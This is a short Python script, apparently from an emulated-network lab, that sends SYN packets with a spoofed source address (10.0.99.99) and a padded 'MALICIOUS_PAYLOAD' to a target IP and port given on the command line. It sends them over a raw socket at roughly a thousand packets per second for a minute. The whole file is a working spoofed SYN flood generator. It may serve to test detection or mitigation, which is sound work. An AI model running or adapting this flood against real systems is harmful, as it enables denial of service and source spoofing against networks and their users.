import sys
import time
import socket
from packet_utils import build_ipv4_tcp, build_ethernet_header

server_ip = sys.argv[1]
port = int(sys.argv[2])
spoofed_ip = "10.0.99.99"

# We send packets for 60 seconds
start_time = time.time()
seq = 1000

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind(("h1-eth0", 0))

eth_hdr = build_ethernet_header("00:04:00:00:01:01", "00:04:00:00:02:01", 0x0800)
payload = b"MALICIOUS_PAYLOAD".ljust(1000, b"X")

while time.time() - start_time < 60.0:
    ip_tcp_payload = build_ipv4_tcp(spoofed_ip, server_ip, 50000, port, "S", seq, payload=payload)
    pkt = eth_hdr + ip_tcp_payload
    s.send(pkt)
    seq += 1
    time.sleep(0.001)
